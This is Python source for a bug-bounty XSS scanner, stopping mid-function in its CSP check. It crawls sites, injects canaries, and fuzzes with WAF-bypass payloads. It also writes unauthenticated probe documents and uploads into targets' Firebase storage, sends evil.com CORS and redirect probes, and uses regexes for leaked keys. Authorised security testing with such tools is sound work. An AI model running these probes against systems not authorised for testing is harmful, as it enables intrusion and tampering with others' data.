#!/usr/bin/env python3
"""
XSS Scanner — Hybrid automated XSS discovery tool
Combines katana (crawl), wafw00f (WAF detection), dalfox (fuzzing),
JS bundle DOM sink analysis, and OOB tracking.

Usage:
  python3 scanner.py -u https://target.com
  python3 scanner.py -u https://target.com --oob https://your.interactsh.com
  python3 scanner.py -u https://target.com --deep --report output.md
"""

import argparse
import asyncio
import json
import os
import re
import shlex
import subprocess
import sys
import threading
import time
import urllib.parse
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from uuid import uuid4

import httpx
from bs4 import BeautifulSoup

# ── Colours ──────────────────────────────────────────────────────────────────
R  = "\033[91m"   # red
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
B  = "\033[94m"   # blue
M  = "\033[95m"   # magenta
C  = "\033[96m"   # cyan
W  = "\033[97m"   # white
BO = "\033[1m"
RE = "\033[0m"

BANNER = f"""
{M}{BO}
  ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
   ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║
   ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║
  ██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{RE}{C}  XSS Scanner — Automated Discovery + WAF Bypass{RE}
{Y}  For authorized bug bounty testing only{RE}
"""

CANARY    = "xss" + uuid4().hex[:8]
GOPATH    = subprocess.getoutput("go env GOPATH").strip()
GOBIN     = os.path.join(GOPATH, "bin")

# DOM sinks to hunt in JS bundles
DOM_SINKS = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "insertAdjacentHTML", "eval(", "setTimeout(", "setInterval(",
    "new Function(", "location.href", "location.assign", "location.replace",
    "location =", "window.open(", "dangerouslySetInnerHTML", "__html",
    "$.html(", "postMessage", "router.query", "searchParams.get",
    "location.hash", "location.search",
]

# DOM sources
DOM_SOURCES = [
    "location.search", "location.hash", "location.href",
    "document.referrer", "document.cookie", "postMessage",
    "localStorage", "sessionStorage", "window.name",
    "router.query", "useSearchParams", "searchParams",
]

findings = []


def log(level, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    icons = {"info": f"{B}[*]{RE}", "good": f"{G}[+]{RE}",
             "warn": f"{Y}[!]{RE}", "bad":  f"{R}[-]{RE}",
             "crit": f"{R}{BO}[!!!]{RE}"}
    print(f"{icons.get(level,'[?]')} {ts} {msg}")


def run(cmd, timeout=120):
    """Run a shell command, return (stdout, returncode)."""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout,
            env={**os.environ, "PATH": f"{GOBIN}:{os.environ.get('PATH','')}"}
        )
        return result.stdout + result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", 1
    except Exception as e:
        return str(e), 1


# ── Stage 1: WAF Detection ────────────────────────────────────────────────────
def detect_waf(target):
    log("info", f"Detecting WAF on {target}...")
    out, _ = run(f"wafw00f {shlex.quote(target)} -a 2>&1")
    waf = "generic"
    for line in out.splitlines():
        low = line.lower()
        if "cloudflare" in low:   waf = "cloudflare"; break
        if "akamai"     in low:   waf = "akamai";     break
        if "aws"        in low:   waf = "aws_waf";    break
        if "sucuri"     in low:   waf = "generic";    break
        if "no waf"     in low:   waf = "none";       break

    if waf == "none":
        log("good", "No WAF detected — standard payload list will be used")
    else:
        log("warn", f"WAF detected: {BO}{waf.upper()}{RE} — loading bypass wordlist")
    return waf


# ── Stage 2: Crawl ────────────────────────────────────────────────────────────
def crawl(target, depth=3):
    log("info", f"Crawling {target} (depth={depth})...")
    out, code = run(
        f"katana -u {shlex.quote(target)} -d {depth} -jc -kf all -silent -o /tmp/xss_urls.txt 2>&1",
        timeout=180
    )
    urls = []
    try:
        with open("/tmp/xss_urls.txt") as f:
            urls = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        pass

    # Also extract from stdout
    for line in out.splitlines():
        if line.startswith("http"):
            urls.append(line.strip())

    urls = list(set(urls))
    log("good", f"Discovered {len(urls)} URLs")
    return urls


# ── Stage 3: Canary Injection ─────────────────────────────────────────────────
def inject_canary(urls):
    log("info", f"Injecting canary ({CANARY}) into {len(urls)} URLs (GET + POST forms)...")
    reflected = []
    lock = threading.Lock()

    with httpx.Client(timeout=10, follow_redirects=True,
                      verify=False, headers={"User-Agent": "Mozilla/5.0"}) as client:

        def probe_get(url, param, params, parsed):
            test_params = {k: (CANARY if k == param else v[0]) for k, v in params.items()}
            test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
            try:
                resp = client.get(test_url)
                if CANARY in resp.text:
                    context = get_context(resp.text, CANARY)
                    if context == "nextjs_rsc":
                        return
                    log("good", f"Reflected GET [{context}] → {param} in {url}")
                    with lock:
                        reflected.append({"url": url, "param": param,
                                          "context": context, "test_url": test_url,
                                          "method": "GET"})
            except Exception:
                pass

        def probe_post_forms(url):
            parsed = urllib.parse.urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            try:
                resp = client.get(url)
                soup = BeautifulSoup(resp.text, "html.parser")
                for form in soup.find_all("form", method=re.compile(r"^post$", re.I)):
                    action = form.get("action") or url
                    if not action.startswith("http"):
                        action = (base + action) if action.startswith("/") else url
                    inputs = {
                        inp["name"]: inp.get("value", "test")
                        for inp in form.find_all(["input", "textarea"])
                        if inp.get("name") and inp.get("type", "").lower()
                        not in ("submit", "button", "image", "reset", "file")
                    }
                    if not inputs:
                        continue
                    for field in list(inputs):
                        data = {k: (CANARY if k == field else v) for k, v in inputs.items()}
                        try:
                            r = client.post(action, data=data)
                            if CANARY in r.text:
                                context = get_context(r.text, CANARY)
                                if context == "nextjs_rsc":
                                    continue
                                log("good", f"Reflected POST [{context}] → {field} at {action}")
                                with lock:
                                    reflected.append({"url": url, "param": field,
                                                      "context": context, "test_url": action,
                                                      "method": "POST"})
                        except Exception:
                            pass
            except Exception:
                pass

        # Build GET tasks from URLs that have query params
        get_tasks = []
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params:
                get_tasks.append((url, param, params, parsed))

        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = [executor.submit(probe_get, url, param, params, parsed)
                       for url, param, params, parsed in get_tasks]
            futures += [executor.submit(probe_post_forms, url) for url in urls]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass

    log("good", f"Found {len(reflected)} reflection points")
    return reflected


def get_context(html, canary):
    """Determine injection context from surrounding HTML."""
    idx = html.find(canary)
    if idx == -1:
        return "unknown"
    surrounding = html[max(0, idx-100):idx+100]

    # Next.js RSC false positive — canary inside __next_f.push() routing data
    # These are never executable; Next.js serialises URL params into script data blocks
    pre = html[:idx]
    if "__next_f" in pre[max(0, len(pre)-300):] or "self.__next_f" in pre[max(0, len(pre)-300):]:
        return "nextjs_rsc"

    # Check if inside a script tag
    script_opens  = pre.count("<script")
    script_closes = pre.count("</script")
    if script_opens > script_closes:
        if '"' + canary in html or "'" + canary in html:
            return "js_string"
        return "js_block"

    # Check if inside an attribute
    if re.search(r'(?:href|src|value|action|data)[=\s]*["\']?[^"\'<>]*' + canary, surrounding):
        return "html_attribute"

    return "html_body"


# ── Stage 4: JS Bundle Analysis ───────────────────────────────────────────────
def analyze_js_bundles(target):
    log("info", "Downloading and analysing JavaScript bundles...")
    bundle_dir = Path("/tmp/xss_bundles")
    bundle_dir.mkdir(exist_ok=True)
    sink_findings = []

    with httpx.Client(timeout=15, follow_redirects=True, verify=False) as client:
        try:
            resp = client.get(target)
            html = resp.text
        except Exception as e:
            log("bad", f"Failed to fetch target: {e}")
            return sink_findings

        # Extract JS bundle URLs
        soup = BeautifulSoup(html, "html.parser")
        js_urls = []

        # Standard script tags
        for tag in soup.find_all("script", src=True):
            src = tag["src"]
            if src.startswith("http"):
                js_urls.append(src)
            elif src.startswith("/"):
                base = f"{urllib.parse.urlparse(target).scheme}://{urllib.parse.urlparse(target).netloc}"
                js_urls.append(base + src)

        # Next.js chunks
        nextjs_chunks = re.findall(r'/_next/static/chunks/[^\s"\'<>]+\.js', html)
        base = f"{urllib.parse.urlparse(target).scheme}://{urllib.parse.urlparse(target).netloc}"
        for chunk in nextjs_chunks:
            js_urls.append(base + chunk)

        js_urls = list(set(js_urls))
        log("info", f"Found {len(js_urls)} JS bundles")

        # Download and analyse each bundle
        for js_url in js_urls[:30]:  # cap at 30 bundles
            try:
                r = client.get(js_url, timeout=10)
                if r.status_code != 200:
                    continue
                content = r.text
                fname = bundle_dir / (urllib.parse.quote(js_url, safe="")[-60:] + ".js")
                fname.write_text(content, encoding="utf-8", errors="ignore")

                # Check for source maps
                map_url = js_url + ".map"
                map_r = client.get(map_url, timeout=5)
                if map_r.status_code == 200:
                    log("warn", f"Source map exposed: {map_url}")
                    sink_findings.append({
                        "type": "source_map_exposed",
                        "url": map_url,
                        "severity": "MEDIUM",
                        "detail": "Source map publicly accessible — exposes original source code"
                    })

                # Hunt for sinks
                for sink in DOM_SINKS:
                    if sink in content:
                        # Get surrounding context
                        idx = content.find(sink)
                        ctx = content[max(0, idx-80):idx+120].replace("\n", " ").strip()
                        severity = "HIGH" if sink in [
                            "dangerouslySetInnerHTML", "__html", "eval(",
                            "innerHTML", "document.write"
                        ] else "MEDIUM"
                        log("warn" if severity == "MEDIUM" else "bad",
                            f"DOM sink [{severity}] {sink} in {js_url.split('/')[-1]}")
                        sink_findings.append({
                            "type": "dom_sink",
                            "sink": sink,
                            "url": js_url,
                            "context": ctx[:200],
                            "severity": severity
                        })

                # Hunt for sources feeding sinks
                for source in DOM_SOURCES:
                    if source in content:
                        log("info", f"DOM source {source} found in {js_url.split('/')[-1]}")
                        sink_findings.append({
                            "type": "dom_source",
                            "source": source,
                            "url": js_url,
                            "severity": "INFO"
                        })

            except Exception:
                continue

    high = sum(1 for f in sink_findings if f.get("severity") == "HIGH")
    med  = sum(1 for f in sink_findings if f.get("severity") == "MEDIUM")
    log("good", f"JS analysis complete — {high} HIGH, {med} MEDIUM sink findings")
    return sink_findings


# ── Stage 5: XSS Fuzzing with Dalfox ─────────────────────────────────────────
def fuzz_with_dalfox(target, waf, oob=None, reflected=None):
    log("info", "Running dalfox XSS fuzzer...")
    xss_findings = []

    # Load WAF-specific bypass wordlist
    bypass_file = Path(__file__).parent / "waf_bypasses.json"
    waf_payloads = []
    if bypass_file.exists():
        with open(bypass_file) as f:
            bypasses = json.load(f)
            waf_payloads = bypasses.get(waf, bypasses.get("generic", []))
        log("info", f"Loaded {len(waf_payloads)} WAF bypass payloads for {waf}")

    # Write custom payload file
    custom_payload_file = "/tmp/xss_custom_payloads.txt"
    payload_file = Path(__file__).parent / "payloads.txt"
    all_payloads = waf_payloads[:]
    if payload_file.exists():
        with open(payload_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    all_payloads.append(line)

    with open(custom_payload_file, "w") as f:
        f.write("\n".join(all_payloads))

    # Clean up leftover results from previous scans
    for tmp in ["/tmp/dalfox_results.txt", "/tmp/xss_urls.txt"]:
        try:
            os.remove(tmp)
        except FileNotFoundError:
            pass

    # Build dalfox command
    oob_flag = f"--blind {oob}" if oob else ""
    dalfox_base = (
        f"dalfox url {shlex.quote(target)} "
        f"--custom-payload {custom_payload_file} "
        f"--skip-bav "
        f"--silence "
        f"--output /tmp/dalfox_results.txt "
        f"{oob_flag} "
        f"2>&1"
    )

    log("info", f"Fuzzing target: {target}")
    out, _ = run(dalfox_base, timeout=300)

    # Also fuzz GET-reflected params individually (dalfox is a GET fuzzer)
    if reflected:
        get_reflected = [r for r in reflected if r.get("method", "GET") == "GET"]
        for r in get_reflected[:10]:  # cap at 10
            param_url = r["test_url"]
            log("info", f"Fuzzing reflected param: {r['param']}")
            cmd = (
                f"dalfox url {shlex.quote(param_url)} "
                f"--custom-payload {custom_payload_file} "
                f"--skip-bav --silence "
                f"{oob_flag} "
                f"2>&1"
            )
            param_out, _ = run(cmd, timeout=120)
            out += param_out

    # Parse dalfox output
    try:
        with open("/tmp/dalfox_results.txt") as f:
            out += f.read()
    except FileNotFoundError:
        pass

    for line in out.splitlines():
        # [V] = dalfox verified execution in real browser context — only real confirmed XSS
        if "[V]" in line:
            log("crit", f"XSS Confirmed: {line.strip()}")
            xss_findings.append({
                "type": "xss_confirmed",
                "detail": line.strip(),
                "severity": "HIGH"
            })
        # [POC] = parameter reflected payload but execution not browser-verified
        # Logged for awareness but NOT counted as confirmed — requires manual verification
        elif "[POC]" in line:
            log("info", f"XSS PoC (needs manual verify): {line.strip()}")
            xss_findings.append({
                "type": "xss_poc_unverified",
                "detail": line.strip(),
                "severity": "MEDIUM"
            })

    log("good", f"Dalfox complete — {len(xss_findings)} XSS findings")
    return xss_findings


# ── Stage 7: Firebase Misconfiguration Detection ─────────────────────────────
def check_firebase(js_findings):
    log("info", "Checking for Firebase misconfiguration...")
    firebase_findings = []

    # Collect all JS bundle content already downloaded
    bundle_dir = Path("/tmp/xss_bundles")
    if not bundle_dir.exists():
        log("warn", "No JS bundles cached — skipping Firebase check")
        return firebase_findings

    # Patterns to extract Firebase config values
    config_patterns = {
        "apiKey":        r'"apiKey"\s*:\s*"([^"]+)"',
        "projectId":     r'"projectId"\s*:\s*"([^"]+)"',
        "databaseURL":   r'"databaseURL"\s*:\s*"([^"]+)"',
        "storageBucket": r'"storageBucket"\s*:\s*"([^"]+)"',
        "authDomain":    r'"authDomain"\s*:\s*"([^"]+)"',
    }

    config = {}
    for bundle_file in bundle_dir.glob("*.js"):
        try:
            content = bundle_file.read_text(encoding="utf-8", errors="ignore")
            if "firebaseConfig" not in content and "initializeApp" not in content:
                continue
            for key, pattern in config_patterns.items():
                if key not in config:
                    match = re.search(pattern, content)
                    if match:
                        config[key] = match.group(1)
        except Exception:
            continue

    if not config:
        log("info", "No Firebase config found in JS bundles")
        return firebase_findings

    log("warn", f"Firebase config found — projectId: {config.get('projectId','?')}")
    firebase_findings.append({
        "type": "firebase_config_exposed",
        "severity": "INFO",
        "detail": f"Firebase config exposed in JS bundle: {config}"
    })

    api_key    = config.get("apiKey", "")
    project_id = config.get("projectId", "")
    db_url     = config.get("databaseURL", "")
    bucket     = config.get("storageBucket", "")

    if not api_key or not project_id:
        log("warn", "Incomplete Firebase config — skipping rule tests")
        return firebase_findings

    with httpx.Client(timeout=10, verify=False) as client:

        # Test 1 — Firestore unauthenticated read
        try:
            fs_url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents"
            r = client.get(fs_url, params={"key": api_key})
            if r.status_code == 200:
                log("crit", f"Firestore OPEN READ — unauthenticated access to all documents")
                firebase_findings.append({
                    "type": "firebase_firestore_open_read",
                    "severity": "CRITICAL",
                    "detail": f"GET {fs_url} returned 200 without authentication",
                    "evidence": r.text[:300]
                })
            elif r.status_code == 403:
                log("good", "Firestore read: LOCKED (403)")
            else:
                log("info", f"Firestore read: {r.status_code}")
        except Exception as e:
            log("bad", f"Firestore read test failed: {e}")

        # Test 2 — Firestore unauthenticated write
        try:
            fs_write_url = f"https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents/bb_test"
            payload = {"fields": {"bb_probe": {"stringValue": f"{CANARY}_bb_test"}}}
            r = client.post(fs_write_url, params={"key": api_key}, json=payload)
            if r.status_code in (200, 201):
                log("crit", f"Firestore OPEN WRITE — unauthenticated document creation confirmed")
                firebase_findings.append({
                    "type": "firebase_firestore_open_write",
                    "severity": "CRITICAL",
                    "detail": f"POST {fs_write_url} returned {r.status_code} without authentication",
                    "evidence": r.text[:300]
                })
            elif r.status_code == 403:
                log("good", "Firestore write: LOCKED (403)")
            else:
                log("info", f"Firestore write: {r.status_code}")
        except Exception as e:
            log("bad", f"Firestore write test failed: {e}")

        # Test 3 — Realtime Database unauthenticated read
        if db_url:
            try:
                rtdb_url = db_url.rstrip("/") + "/.json"
                r = client.get(rtdb_url, params={"auth": api_key})
                if r.status_code == 200 and r.text.strip() not in ("null", ""):
                    log("crit", f"Realtime DB OPEN READ — data accessible without auth")
                    firebase_findings.append({
                        "type": "firebase_rtdb_open_read",
                        "severity": "CRITICAL",
                        "detail": f"GET {rtdb_url} returned data without authentication",
                        "evidence": r.text[:300]
                    })
                elif r.status_code == 200 and r.text.strip() == "null":
                    log("info", "Realtime DB: accessible but empty (null)")
                elif r.status_code == 401:
                    log("good", "Realtime DB read: LOCKED (401)")
                else:
                    log("info", f"Realtime DB read: {r.status_code}")
            except Exception as e:
                log("bad", f"RTDB read test failed: {e}")

        # Test 4 — Firebase Storage unauthenticated list
        if bucket:
            try:
                storage_url = f"https://firebasestorage.googleapis.com/v0/b/{bucket}/o"
                r = client.get(storage_url, params={"key": api_key})
                if r.status_code == 200:
                    items = r.json().get("items", [])
                    log("crit" if items else "warn",
                        f"Storage {'OPEN — ' + str(len(items)) + ' files listed' if items else 'accessible but empty'}")
                    if items:
                        firebase_findings.append({
                            "type": "firebase_storage_open_list",
                            "severity": "HIGH",
                            "detail": f"Firebase Storage listing accessible without auth — {len(items)} files",
                            "evidence": str([i.get("name") for i in items[:5]])
                        })
                elif r.status_code == 403:
                    log("good", "Firebase Storage: LOCKED (403)")
                else:
                    log("info", f"Firebase Storage list: {r.status_code}")
            except Exception as e:
                log("bad", f"Storage list test failed: {e}")

        # Test 5 — Firebase Storage unauthenticated upload
        if bucket:
            try:
                upload_url = f"https://firebasestorage.googleapis.com/v0/b/{bucket}/o"
                r = client.post(
                    upload_url,
                    params={"key": api_key, "name": f"bb_test/{CANARY}.txt", "uploadType": "media"},
                    headers={"Content-Type": "text/plain"},
                    content=b"bug bounty probe - authorized test"
                )
                if r.status_code in (200, 201):
                    log("crit", "Storage OPEN UPLOAD — unauthenticated file upload confirmed")
                    firebase_findings.append({
                        "type": "firebase_storage_open_upload",
                        "severity": "HIGH",
                        "detail": f"Unauthenticated file upload to Firebase Storage succeeded",
                        "evidence": r.text[:300]
                    })
                elif r.status_code == 403:
                    log("good", "Firebase Storage upload: LOCKED (403)")
                else:
                    log("info", f"Firebase Storage upload: {r.status_code}")
            except Exception as e:
                log("bad", f"Storage upload test failed: {e}")

    crits = [f for f in firebase_findings if f["severity"] == "CRITICAL"]
    highs = [f for f in firebase_findings if f["severity"] == "HIGH"]
    log("good", f"Firebase check complete — {len(crits)} CRITICAL, {len(highs)} HIGH")
    return firebase_findings


# ── Stage 8: Secrets Detection ────────────────────────────────────────────────
def detect_secrets():
    log("info", "Scanning JS bundles for exposed secrets...")
    secret_findings = []

    SECRET_PATTERNS = [
        ("aws_access_key",     r'(?<![A-Z0-9])(AKIA[0-9A-Z]{16})(?![A-Z0-9])',                          "CRITICAL"),
        ("aws_secret_key",     r'(?i)aws.{0,20}secret.{0,20}["\']([A-Za-z0-9/+]{40})["\']',             "CRITICAL"),
        ("github_token",       r'ghp_[A-Za-z0-9]{36}',                                                   "CRITICAL"),
        ("github_oauth",       r'gho_[A-Za-z0-9]{36}',                                                   "CRITICAL"),
        ("stripe_live_key",    r'sk_live_[A-Za-z0-9]{24,}',                                              "CRITICAL"),
        ("stripe_test_key",    r'sk_test_[A-Za-z0-9]{24,}',                                              "HIGH"),
        ("twilio_sid",         r'AC[a-f0-9]{32}',                                                        "HIGH"),
        ("slack_token",        r'xox[bpars]-[A-Za-z0-9\-]{10,}',                                         "HIGH"),
        ("sendgrid_key",       r'SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}',                           "HIGH"),
        ("jwt_token",          r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}',    "MEDIUM"),
        ("private_key_header", r'-----BEGIN (?:RSA |EC |)PRIVATE KEY-----',                              "CRITICAL"),
        ("mailgun_key",        r'key-[a-zA-Z0-9]{32}',                                                   "HIGH"),
        ("generic_api_key",    r'(?i)(?:api_key|apikey|api-key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})["\']', "MEDIUM"),
    ]

    bundle_dir = Path("/tmp/xss_bundles")
    if not bundle_dir.exists():
        log("warn", "No JS bundles cached — skipping secrets detection")
        return secret_findings

    seen = set()
    for bundle_file in bundle_dir.glob("*.js"):
        try:
            content = bundle_file.read_text(encoding="utf-8", errors="ignore")
            for name, pattern, severity in SECRET_PATTERNS:
                for match in re.finditer(pattern, content):
                    secret = match.group(0)[:60]
                    dedup_key = (name, secret[:20])
                    if dedup_key in seen:
                        continue
                    seen.add(dedup_key)
                    idx = match.start()
                    ctx = content[max(0, idx-30):idx+len(secret)+30].replace("\n", " ").strip()
                    log("crit" if severity == "CRITICAL" else "warn",
                        f"Secret [{severity}] {name}: {secret[:40]}...")
                    secret_findings.append({
                        "type":     "secret_" + name,
                        "severity": severity,
                        "detail":   f"{name} found in {bundle_file.name}",
                        "secret":   secret,
                        "context":  ctx[:150],
                    })
        except Exception:
            continue

    log("good", f"Secrets scan complete — {len(secret_findings)} potential secrets found")
    return secret_findings


# ── Stage 9: CORS Misconfiguration ───────────────────────────────────────────
def check_cors(target):
    log("info", "Testing CORS misconfiguration...")
    cors_findings = []
    evil_origin = "https://evil.com"

    parsed = urllib.parse.urlparse(target)
    base   = target.rstrip("/")
    root   = f"{parsed.scheme}://{parsed.netloc}"
    test_urls = list(dict.fromkeys([
        target, root,
        base + "/api", base + "/api/v1", base + "/api/v2",
        root + "/api", root + "/graphql",
    ]))

    with httpx.Client(timeout=10, verify=False, follow_redirects=True) as client:
        for url in test_urls:
            try:
                r = client.get(url, headers={"Origin": evil_origin, "User-Agent": "Mozilla/5.0"})
                acao = r.headers.get("access-control-allow-origin", "")
                acac = r.headers.get("access-control-allow-credentials", "").lower()

                if acao == evil_origin and acac == "true":
                    log("crit", f"CORS CRITICAL — origin reflected + credentials=true at {url}")
                    cors_findings.append({
                        "type":     "cors_credentials_reflected",
                        "severity": "CRITICAL",
                        "url":      url,
                        "detail":   "ACAO reflects attacker origin AND credentials=true — full session hijack possible",
                    })
                elif acao == "*" and acac == "true":
                    log("crit", f"CORS CRITICAL — wildcard + credentials=true at {url}")
                    cors_findings.append({
                        "type":     "cors_wildcard_credentials",
                        "severity": "CRITICAL",
                        "url":      url,
                        "detail":   "Wildcard CORS with credentials=true — invalid config, exploitable",
                    })
                elif acao == evil_origin:
                    log("warn", f"CORS MEDIUM — origin reflected (no credentials) at {url}")
                    cors_findings.append({
                        "type":     "cors_origin_reflected",
                        "severity": "MEDIUM",
                        "url":      url,
                        "detail":   "ACAO reflects attacker origin without credentials — low-impact for credentialed endpoints",
                    })
            except Exception:
                continue

    crits = [f for f in cors_findings if f["severity"] == "CRITICAL"]
    log("good", f"CORS check complete — {len(crits)} CRITICAL, {len(cors_findings)} total")
    return cors_findings


# ── Stage 10: Open Redirect Detection ────────────────────────────────────────
def check_open_redirect(urls):
    log("info", "Testing for open redirects...")
    redirect_findings = []
    evil_url = "https://evil.com"

    REDIRECT_PARAMS = {
        "redirect", "redirect_uri", "redirect_url", "return", "returnto",
        "return_url", "return_to", "next", "next_url", "url", "goto",
        "destination", "dest", "target", "redir", "link", "continue",
        "forward", "callback", "back", "ref", "referer", "referrer",
        "u", "r", "location", "out", "jump", "to", "from",
    }

    # Top redirect params to use in synthetic probing (smaller set to control volume)
    TOP_REDIRECT_PARAMS = [
        "redirect", "url", "next", "return", "goto", "destination", "redirect_uri", "return_url",
    ]

    tested = set()
    with httpx.Client(timeout=8, verify=False, follow_redirects=False,
                      headers={"User-Agent": "Mozilla/5.0"}) as client:

        def _check(test_url, url, param):
            if test_url in tested:
                return
            tested.add(test_url)
            try:
                r = client.get(test_url)
                location = r.headers.get("location", "")
                if r.status_code in (301, 302, 303, 307, 308) and "evil.com" in location:
                    log("crit", f"Open redirect — param '{param}' redirects to evil.com at {url}")
                    redirect_findings.append({
                        "type":     "open_redirect",
                        "severity": "HIGH",
                        "url":      url,
                        "param":    param,
                        "test_url": test_url,
                        "detail":   f"Param '{param}' causes redirect to {location}",
                    })
            except Exception:
                pass

        # Pass 1 — test redirect params already present in crawled URLs
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            for param in params:
                if param.lower() not in REDIRECT_PARAMS:
                    continue
                test_params = {k: (evil_url if k == param else v[0]) for k, v in params.items()}
                test_url = parsed._replace(query=urllib.parse.urlencode(test_params)).geturl()
                _check(test_url, url, param)

        # Pass 2 — synthetic: inject top redirect params into unique base paths
        seen_paths = set()
        for url in urls:
            parsed = urllib.parse.urlparse(url)
            path_key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if path_key in seen_paths:
                continue
            seen_paths.add(path_key)
            if len(seen_paths) > 30:
                break
            for rp in TOP_REDIRECT_PARAMS:
                test_url = f"{path_key}?{rp}={urllib.parse.quote(evil_url, safe='')}"
                _check(test_url, path_key, rp)

    log("good", f"Redirect check complete — {len(redirect_findings)} open redirects found")
    return redirect_findings


# ── Stage 11: Cloud Storage Misconfiguration ──────────────────────────────────
def check_cloud_storage():
    log("info", "Checking for exposed cloud storage buckets...")
    storage_findings = []

    bundle_dir = Path("/tmp/xss_bundles")
    if not bundle_dir.exists():
        return storage_findings

    s3_buckets  = set()
    gcs_buckets = set()

    S3_PATTERNS = [
        r'https?://([a-z0-9][a-z0-9\-]{2,62})\.s3(?:[\.\-][a-z0-9\-]+)?\.amazonaws\.com',
        r's3://([a-z0-9][a-z0-9\-]{2,62})',
        r'https?://s3(?:[\.\-][a-z0-9\-]+)?\.amazonaws\.com/([a-z0-9][a-z0-9\-]{2,62})',
    ]
    GCS_PATTERNS = [
        r'https?://storage\.googleapis\.com/([a-z0-9][a-z0-9\-_.]{1,61}[a-z0-9])/',
        r'gs://([a-z0-9][a-z0-9\-_.]{1,61}[a-z0-9])',
        r'https?://([a-z0-9][a-z0-9\-_.]{1,61}[a-z0-9])\.storage\.googleapis\.com',
    ]

    for bundle_file in bundle_dir.glob("*.js"):
        try:
            content = bundle_file.read_text(encoding="utf-8", errors="ignore")
            for pat in S3_PATTERNS:
                for m in re.finditer(pat, content, re.IGNORECASE):
                    s3_buckets.add(m.group(1).lower())
            for pat in GCS_PATTERNS:
                for m in re.finditer(pat, content, re.IGNORECASE):
                    gcs_buckets.add(m.group(1).lower())
        except Exception:
            continue

    log("info", f"Found {len(s3_buckets)} S3, {len(gcs_buckets)} GCS buckets in bundles")

    with httpx.Client(timeout=10, verify=False, follow_redirects=True) as client:

        for bucket in list(s3_buckets)[:10]:
            try:
                s3_url = f"https://{bucket}.s3.amazonaws.com/?list-type=2"
                r = client.get(s3_url)
                if r.status_code == 200 and "<ListBucketResult" in r.text:
                    count = r.text.count("<Key>")
                    log("crit", f"S3 OPEN LISTING — {bucket}: {count} objects")
                    storage_findings.append({
                        "type":     "s3_open_listing",
                        "severity": "HIGH",
                        "bucket":   bucket,
                        "url":      s3_url,
                        "detail":   f"S3 bucket '{bucket}' allows unauthenticated listing — {count} objects",
                        "evidence": r.text[:300],
                    })
                elif r.status_code == 403:
                    log("good", f"S3 '{bucket}': LOCKED (403)")
            except Exception:
                continue

        for bucket in list(gcs_buckets)[:10]:
            try:
                gcs_url = f"https://storage.googleapis.com/storage/v1/b/{bucket}/o"
                r = client.get(gcs_url)
                if r.status_code == 200:
                    items = r.json().get("items", [])
                    if items:
                        log("crit", f"GCS OPEN LISTING — {bucket}: {len(items)} objects")
                        storage_findings.append({
                            "type":     "gcs_open_listing",
                            "severity": "HIGH",
                            "bucket":   bucket,
                            "url":      gcs_url,
                            "detail":   f"GCS bucket '{bucket}' allows unauthenticated listing — {len(items)} objects",
                            "evidence": str([i.get("name") for i in items[:5]]),
                        })
                    else:
                        log("info", f"GCS '{bucket}': accessible but empty")
                elif r.status_code == 403:
                    log("good", f"GCS '{bucket}': LOCKED (403)")
            except Exception:
                continue

    log("good", f"Cloud storage check complete — {len(storage_findings)} findings")
    return storage_findings


# ── Stage 12: CSP Analyser ────────────────────────────────────────────────────
def analyze_csp(target):
    log("info", "Analysing Content-Security-Policy...")
    csp_findings = []

    WEAK_KEYWORDS = {
        "'unsafe-inline'": ("CSP allows unsafe-inline scripts — bypasses script nonces/hashes", "HIGH"),
        "'unsafe-eval'":   ("CSP allows unsafe-eval — eval() and new Function() are unblocked",  "HIGH"),
        "data:":           ("CSP allows data: URIs in script context — trivial bypass",            "HIGH"),
        "'unsafe-hashes'": ("CSP unsafe-hashes can permit inline event handler execution",         "MEDIUM"),
    }
    WILDCARD_PATTERNS = [
        (r"script-src\s[^;]*\s\*",  "Wildcard (*) in script-src — any origin can load scripts", "CRITICAL"),
        (r"default-src\s[^;]*\s\*", "Wildcard (*) in default-src",                              "CRITICAL"),
        (r"script-src\s[^;]*http:/", "HTTP origin in script-src — MITM can inject scripts",     "HIGH"),
    ]

    with httpx.Client(timeout=10, verify=False, follow_redirects=True) as client:
        try:
            r = client.get(target, headers={"User-Agent": "Mozilla/5.0"})
        except Exception as e:
            log("bad", f"CSP fetch failed: {e}")
            return csp_findings

        csp = r.headers.get("content-security-policy", "")
        if not csp:
            log("warn", "No Content-Security-Policy header — browser-side XSS mitigation absent")
            csp_findings.append({
                "type":     "csp_missing",
                "severity": "MEDIUM",
                "detail":   "No CSP header — browser executes all inline scripts without restriction",
                "csp":      "",
            })
            return csp_findings

        log("info", f"CSP found ({len(csp)} chars)")

        for keyword, (detail, severity) in WEAK_KEYWORDS.items():
            if keyword in csp:
